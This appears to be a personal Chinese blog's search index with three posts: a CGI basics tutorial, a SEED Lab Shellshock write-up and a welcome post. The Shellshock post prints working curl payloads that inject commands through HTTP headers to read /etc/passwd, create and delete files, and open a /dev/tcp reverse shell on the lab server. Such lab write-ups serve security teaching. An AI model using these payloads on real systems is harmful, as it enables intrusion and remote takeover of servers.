<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CGI学习</title>
      <link href="/2022/01/23/CGI%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/01/23/CGI%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>CGI(Common Gateway Interface)严格来说是一个协议标准，不管是什么编程语言，只要符合该标准的规则就可以被称为CGI程序或者CGI脚本。<br>CGI是为Web服务器产生动态内容而创造的。在该标准出现前服务器所提供的都是静态内容，也就是存储在磁盘上面的文件，服务器在收到请求后直接将磁盘文件内容发送给客户端。而CGI出现之后，服务器就可以与后端的数据库进行交互。</p><h1 id="CGI工作原理"><a href="#CGI工作原理" class="headerlink" title="CGI工作原理"></a>CGI工作原理</h1><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  flowchart TB    浏览器--HTTP请求&#x2F;cgi-bin&#x2F;hello.py--&gt;B[服务器]    B--HTTP响应--&gt;浏览器    B--调用并传递参数--&gt;C[CGI程序]    C--返回执行结果--&gt;B    C--请求--&gt;D[数据库]    D--响应--&gt;C  </pre></div><p>首先通过向浏览器中输入URL来向服务器请求CGI程序并传入参数。服务器在知道客户端要访问CGI程序后，会先fork一个新的shell进程然后运行/cgi-bin/hello.py这个CGI程序，CGI程序可以与后端的数据库进行一些交互并将最终的结果返回给服务器，服务器再发送给客户端。<br>这是一个大致的工作流程，但是其中有几个问题需要解决。服务器如何将参数传递给子进程？服务器如何将其他信息传递给子进程?CGI的执行结果如何返回给客户端？</p><ol><li>服务器会将URL后面跟随的参数赋值给环境变量<code>QUERY_STRING</code>，环境变量会传递给子进程，这样子进程便也可以访问传进来的参数。</li><li>服务器其他的一些信息，比如监听的端口、客户端IP地址等，同样的也会赋值给相应的环境变量并传递给子进程。</li><li>在子进程加载并运行CGI程序前，服务器会将标准输出重定向到与客户端相关联的套接字描述符，这样就会将输出的内容发送给客户端。需要注意的一点是，内容类型<code>Content-type</code>和长度<code>Content-length</code>都需要子进程来进行设置。<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2>接下来通过一个Apache服务器的例子来进一步说明工作的原理。<h3 id="环境下载"><a href="#环境下载" class="headerlink" title="环境下载"></a>环境下载</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">apache:</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">httpd:2.4</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;18008:80&quot;</span></span><br><span class="line">        <span class="attr">tty:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">volumes:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;./:/tmp&quot;</span></span><br></pre></td></tr></table></figure><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3>开启Apache服务器的CGI，修改apache的配置文件conf目录下的httpd.conf。</li></ol><ul><li>注释掉<code>LoadModule cgid_module modules/mod_cgid.so</code>来加载CGI模块。</li><li><code>ScriptAlias &quot;/cgi-bin/&quot; &quot;/usr/local/apache2/cgi-bin/&quot;</code>将存放CGI程序的目录与URL访问路径映射起来，每当访问该路径时，服务器就会将所访问的文件视为CGI程序并尝试去执行。</li><li><code>AddHandler cgi-script .cgi .py</code>除了告诉服务器CGI程序存放的目录外，还要告诉服务器什么后缀的文件也应该被视为CGI程序。</li><li>在服务器目录下执行<code>bin/apachectl restart</code>来重启服务器加载配置文件。<br>更多的配置信息可以参考<a href="https://httpd.apache.org/docs/2.4/howto/cgi.html">官方链接</a><h3 id="CGI程序"><a href="#CGI程序" class="headerlink" title="CGI程序"></a>CGI程序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content-type: text/html\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&lt;h1&gt;Hello from server!&lt;h1&gt;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>C语言编写的一个简单的CGI程序。与之前描述的一样，我们需要先设置必要的部分，这里设置了MIME（Multipurpose Internet Mail Extensions，多用途互联网邮件扩展类型）为html，并且按照格式以一个新的空行标志响应报头的结束，后面跟上响应主体也就是我们想要发送的信息。<h3 id="访问CGI程序"><a href="#访问CGI程序" class="headerlink" title="访问CGI程序"></a>访问CGI程序</h3>浏览器输入<code>http://ip:18008/cgi-bin/hello</code>来访问编译好的CGI程序。<br><img src="https://s2.loli.net/2022/01/25/DuIAoMG9CQlOT71.png" alt="image.png"><br>服务器成功地返回了信息。<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1>CGI是一个很古远的技术了，现在的前后端界限已经没有那么清晰了，比如Node.js是一个基于JavaScript的运行时环境而JavaScript本身属于前端语言的范畴。但是学习一下CGI可以帮助我们理解前后端以及Web服务器之间是如何进行交互的，这样当我们在学习一些更加复杂的技术时可以帮助我们更快的入门。<br>接下来计划继续完善该文章，介绍一些CGI的改进版本。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> CGI </tag>
            
            <tag> 动态内容 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Seedlab-Shellshock</title>
      <link href="/2022/01/23/shellshock/"/>
      <url>/2022/01/23/shellshock/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Shellshock是于2014年发现与bash相关的漏洞，漏洞原因是因为bash在解析函数变量时所调用的解析函数，会将<strong>分号</strong>隔开的语句当作指令而执行，从而造成命令执行。<br><a href="https://seedsecuritylabs.org/Labs_20.04/Software/Shellshock/">本实验原地址</a></p><h1 id="Web服务器与CGI"><a href="#Web服务器与CGI" class="headerlink" title="Web服务器与CGI"></a>Web服务器与CGI</h1><p>许多的Web服务器（Apache和nginx等）开启了CGI，来为web应用生成动态的内容。许多的CGI程序是shell脚本，所以在CGI程序运行前，Web服务器会首先fork一个新的shell程序并将HTTP请求中的一些内容设置为环境变量引入，需要用户进行HTTP请求来触发该CGI程序。<br>需要补充一点的是，CGI程序不仅可以是shell脚本，其他的一些可以接收输入的编程语言比如php等，也可以作为CGI程序来进行解析。</p><h1 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h1><h2 id="熟悉shell函数"><a href="#熟悉shell函数" class="headerlink" title="熟悉shell函数"></a>熟悉shell函数</h2><p>Ubuntu20.04中的bash程序已经被修复，无法再实施攻击。该实验在虚拟机的<mark class="hl-label blue">/bin</mark> 和压缩包的<mark class="hl-label blue">image_www</mark> 目录下安装了一个存在漏洞的bash程序。</p><h3 id="编写一个存在漏洞的shell函数"><a href="#编写一个存在漏洞的shell函数" class="headerlink" title="编写一个存在漏洞的shell函数"></a>编写一个存在漏洞的shell函数</h3><p>正常情况下shell函数的编写：<br><code>foo() &#123; echo &quot;hello world!&quot;; &#125;</code></p><mark class="hl-label red">注意：</mark> 左大括号后面的空格不能丢。<p><code>declare -f foo</code>来输出定义的函数<br>通过直接在shell中输入函数名字即可调用。<br><code>unset -f foo</code>删除定义的函数<br>另一种shell函数的编写方法：<br>上一种方法编写的shell函数如果想要传入子进程,则需要执行<code>export -f foo</code>,也就是将export的函数定义作为环境变量传入子进程。这种方法的缺点就是，父进程必须是shell程序否则无法将函数转化为环境变量引入子进程。<br>还有一种方法是定义一个特殊的变量，如<code>foo=&#39;() &#123; echo &quot;hello world!&quot;; &#125;&#39;</code>，<strong>左大括号左右间的空格不能丢掉</strong>。然后将该变量作为环境变量引入子bash进程<code>export foo</code>，子进程的shell程序会将环境变量转换为它自己的shell变量，如果在转换过程中发现有以<code>() &#123;</code>开头的环境变量时，则会将其转换为shell函数。这样只需要通过一个环境变量即可以传递函数定义。<br>定义一个存在漏洞的shell函数：<br>第二种方法在将环境变量解析为函数时会解析并执行<code>;</code>分隔的shell命令。<br><code>hack=&#39;() &#123; echo &quot;bad shell func!;&quot;&#125;;echo &quot;hacker!\n&quot;&#39;</code><strong>注意分号</strong><br><img src="https://s2.loli.net/2022/01/22/MxNuOp7ef8QKFqD.png" alt="image.png"><br>不同bash的结果如上图所示。</p><h2 id="通过环境变量向bash传入数据"><a href="#通过环境变量向bash传入数据" class="headerlink" title="通过环境变量向bash传入数据"></a>通过环境变量向bash传入数据</h2><div class="note primary simple"><p>Shellshock如果需要成功，需要满足以下两个条件：<br>1.触发bash调用<br>2.将用户输入作为环境变量</p></div><p>方便查看环境变量的CGI程序<mark class="hl-label blue">getenv.cgi</mark> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash_shellshock</span><br><span class="line"></span><br><span class="line">echo &quot;Content-type: text/plain&quot;</span><br><span class="line">echo</span><br><span class="line">echo &quot;****** Environment Variables ******&quot;</span><br><span class="line">strings /proc/$$/environ</span><br></pre></td></tr></table></figure><p><code>$$</code>会被替换为当前的进程ID</p><h3 id="使用浏览器"><a href="#使用浏览器" class="headerlink" title="使用浏览器"></a>使用浏览器</h3><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>浏览器返回内容</span></div>    <div class="hide-content"><p>****** Environment Variables ******<br>HTTP_HOST=<a href="http://www.seedlab-shellshock.com/">www.seedlab-shellshock.com</a><br>HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0<br>HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5<br>HTTP_ACCEPT_ENCODING=gzip, deflate<br>HTTP_CONNECTION=keep-alive<br>HTTP_UPGRADE_INSECURE_REQUESTS=1<br>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at <a href="http://www.seedlab-shellshock.com/">www.seedlab-shellshock.com</a> Port 80</address><br>SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)<br>SERVER_NAME=<a href="http://www.seedlab-shellshock.com/">www.seedlab-shellshock.com</a><br>SERVER_ADDR=10.9.0.80<br>SERVER_PORT=80<br>REMOTE_ADDR=10.9.0.1<br>DOCUMENT_ROOT=/var/www/html<br>REQUEST_SCHEME=http<br>CONTEXT_PREFIX=/cgi-bin/<br>CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/<br>SERVER_ADMIN=webmaster@localhost<br>SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi<br>REMOTE_PORT=45228<br>GATEWAY_INTERFACE=CGI/1.1<br>SERVER_PROTOCOL=HTTP/1.1<br>REQUEST_METHOD=GET<br>QUERY_STRING=<br>REQUEST_URI=/cgi-bin/getenv.cgi<br>SCRIPT_NAME=/cgi-bin/getenv.cgi</p></div></div><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>浏览器可传入的环境变量</span></div>    <div class="hide-content"><ul><li>HTTP_USER_AGENT</li><li>HTTP_ACCEPT</li><li>HTTP_ACCEPT_LANGUAGE</li><li>HTTP_ACCEPT_ENCODING</li><li>HTTP_HOST</li><li>HTTP_CONNECTION</li><li>HTTP_UPGRADE_INSECURE_REQUESTS</li></ul></div></div><h3 id="使用curl"><a href="#使用curl" class="headerlink" title="使用curl"></a>使用curl</h3><ul><li><code>-A</code>改变User-Agent字段</li><li><code>-e</code>改变Referer字段</li><li><code>-H</code>自定义头部，无值<code>Extra-Header;</code>,有值<code>Extra-Header: value</code><br>上面的三个选项均可以用来向环境变量中注入数据。<h2 id="发起攻击"><a href="#发起攻击" class="headerlink" title="发起攻击"></a>发起攻击</h2>目标URL：<a href="http://www.seedlab-shellshock.com/cgi-bin/vul.cgi">http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</a><br>如果攻击命令执行结果是一个纯文本输出，并且我们想要该结果返回，则需要满足该协议：首先要以<code>echo &quot;Content-type: text/plain&quot;;</code>开头，后面跟随着一个空白行<code>echo;</code>，最后是我们想要执行的指令。<br>比如：<code>echo &quot;Content-type: text/plain&quot;;echo;/bin/ls -l</code><h3 id="服务器返回-etc-passwd的内容"><a href="#服务器返回-etc-passwd的内容" class="headerlink" title="服务器返回/etc/passwd的内容"></a>服务器返回/etc/passwd的内容</h3>使用-H选项来进行攻击<br><code>curl -v -H &#39;shArp: () &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/cat /etc/passwd&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi </code><h3 id="服务器返回当前的User-ID"><a href="#服务器返回当前的User-ID" class="headerlink" title="服务器返回当前的User ID"></a>服务器返回当前的User ID</h3>使用-H选项来进行攻击<br><code>curl -v -H &#39;shArp: () &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/id&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi </code><h3 id="在-tmp目录下创建新的文件"><a href="#在-tmp目录下创建新的文件" class="headerlink" title="在/tmp目录下创建新的文件"></a>在/tmp目录下创建新的文件</h3>使用-A选项<br><code>curl -v -A &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/touch /tmp/sharp&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code><br>查看创建的文件：<br><code>curl -v -A &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/ls /tmp -l&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></li></ul><mark class="hl-label red">注意：</mark> 一次只能执行一个命令<h3 id="删除创建的文件"><a href="#删除创建的文件" class="headerlink" title="删除创建的文件"></a>删除创建的文件</h3><p>使用-e选项<br><code>curl -v -e &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/rm /tmp/sharp&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><h3 id="问题回答"><a href="#问题回答" class="headerlink" title="问题回答"></a>问题回答</h3><p>1.不能读取/ect/shadow文件，因为只有root用户以及处于shadow用户组的用户才有读取权限<br>2.不可以（对于我来说）通过在GET请求的数据部分插入代码，这是因为<code>?</code>后面只能跟连续的字符串。curl中?后面加上空格会显示<strong>bad request</strong>,而进行一些编码等处理后会原封不动的赋值给环境变量，从而无法成功的进行解析。</p><h2 id="通过Shellshock创建反向shell"><a href="#通过Shellshock创建反向shell" class="headerlink" title="通过Shellshock创建反向shell"></a>通过Shellshock创建反向shell</h2><p>在发现服务器存在任意命令执行漏洞后，为了我们进一步的攻击往往需要创建一个交互式的shell。反向shell的原理在这里就不在说明。<br><code>curl -v -e &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1 2&gt;&amp;1&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code><br>最终成功的反弹了一个shell<br><img src="https://s2.loli.net/2022/01/23/HgPU8qkNlaI3KA9.png" alt="image.png"><br>作者在这里是直接反弹到了本地虚拟机的ens33端口，由于docker的网络配置其他IP地址可能不会成功反弹shell。</p><h2 id="使用打过补丁的Bash"><a href="#使用打过补丁的Bash" class="headerlink" title="使用打过补丁的Bash"></a>使用打过补丁的Bash</h2><p>修复之后的Bash会直接将函数后面的内容忽略掉，所以不会成功的执行上面命令。具体操作不再展示。</p><h2 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h2><p>对于Linux操作系统来说任何对象均为文件，建立的TCP连接也是一样的，不同编程语言版本的反向shell都是将标准输入、输出的文件描述符重定向到TCP连接的文件描述符从而实现远程控制。</p><h1 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h1><h2 id="curl发送的编码问题"><a href="#curl发送的编码问题" class="headerlink" title="curl发送的编码问题"></a>curl发送的编码问题</h2><p>在GET请求的数据部分发送POC时大括号会消失:<br>原请求<code>curl -v &#39;http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?()+&#123;+echo+&quot;hello&quot;;+&#125;;+echo+&quot;Content-type:+text/plain&quot;;+echo;/bin/ls+/etc/shadow+-l&#39;</code><br>返回的内容<code>QUERY_STRING=()++echo+&quot;hello&quot;;+;+echo+&quot;Content-type:+text/plain&quot;;+echo;/bin/ls+/etc/shadow+-l</code><br>需要使用转义符号<code>\</code>进行转义。<br>GET请求中的一些特殊字符比如空格等，需要进行编码之后进行发送。<br>POST请求如果带有特殊字符可以使用<code>--data-urlencode</code>进行编码或者使用转义字符。</p>]]></content>
      
      
      <categories>
          
          <category> 国外课程 </category>
          
          <category> seedlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> bash </tag>
            
            <tag> CGI </tag>
            
            <tag> curl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello</title>
      <link href="/2022/01/22/Hello/"/>
      <url>/2022/01/22/Hello/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>互联网上的小伙伴们，大家好！<br>这是我的第一个博客，在这里会记录我的学习过程。<br>希望里面的文章会对你有所帮助!</p><div class="note success modern"><p>Keep Learning!</p></div>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>music</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>movies</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友情链接</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
